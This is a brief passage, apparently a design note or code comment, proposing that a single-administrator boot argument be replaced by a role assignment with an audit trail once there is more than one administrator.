Revisit when there is more than one administrator, at which point this stops being a boot argument
and becomes a role assignment with an audit trail.
